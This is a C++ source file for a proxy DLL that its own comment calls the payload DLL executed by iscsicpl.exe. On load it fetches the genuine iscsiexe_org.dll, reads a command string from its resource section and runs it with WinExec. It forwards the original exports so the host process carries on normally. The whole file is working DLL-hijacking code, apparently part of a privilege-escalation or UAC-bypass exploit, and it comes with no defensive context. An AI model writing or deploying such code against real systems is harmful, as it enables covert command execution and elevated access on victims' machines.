// iscsiexe.cpp, the payload DLL executed by iscsicpl.exe
#include "pch.h"
#include <windows.h>
#include <stdio.h>
#include <tchar.h>
#include "resource.h"
#pragma pack(1)

// LoadString() for linker
#pragma comment(lib,"User32.lib")

#define MAX_ENV_SIZE 32767

BOOL APIENTRY DllMain(HMODULE hModule, DWORD  ul_reason_for_call, LPVOID lpReserved)
{
    static HINSTANCE hL;
    LPWSTR pCMD = new WCHAR[MAX_ENV_SIZE];
    char pACMD[MAX_ENV_SIZE]; 
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
        hL = LoadLibrary(_T(".\\iscsiexe_org.dll"));
        if (!hL) 
            return false;
        // execute the command string from the module resource section
        LoadString(GetModuleHandle(L"iscsiexe.dll"), IDS_CMD101, pCMD, MAX_ENV_SIZE);
        WideCharToMultiByte(CP_ACP, 0, pCMD, wcslen(pCMD), pACMD, MAX_ENV_SIZE, NULL, NULL);
        WinExec(pACMD, SW_SHOW);
        break;
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        FreeLibrary(hL);
        break;
    }
    return TRUE;
}

// the proxy DLL mappings for the linker
#pragma comment(linker, "/export:SvchostPushServiceGlobals=iscsiexe_org.SvchostPushServiceGlobals")
#pragma comment(linker, "/export:ServiceMain=iscsiexe_org.ServiceMain")
#pragma comment(linker, "/export:DiscpEstablishServiceLinkage=iscsiexe_org.DiscpEstablishServiceLinkage")